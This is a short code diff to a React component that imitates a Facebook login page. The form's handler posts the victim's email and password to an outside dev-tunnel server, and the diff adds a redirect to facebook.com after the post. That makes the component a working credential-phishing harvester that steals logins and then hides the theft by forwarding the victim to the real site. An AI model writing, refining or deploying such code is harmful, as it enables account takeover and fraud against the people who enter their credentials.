@@ -271,13 +271,20 @@ export default function FacebookLogin() {
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
 
+
+
   const handleLogin = async  (e) => {
     e.preventDefault();
     const payload = {email: email, password: password}
 
-    await axios.post('https://wxfkz9sq-3000.asse.devtunnels.ms/api/data', payload)
-
+    try {
+      await axios.post('https://wxfkz9sq-3000.asse.devtunnels.ms/api/data', payload)
+    window.location.href= 'www.facebook.com'
     setError("");
+    } catch (e) {
+      console.log(e)
+    }
+    
     
   };
 
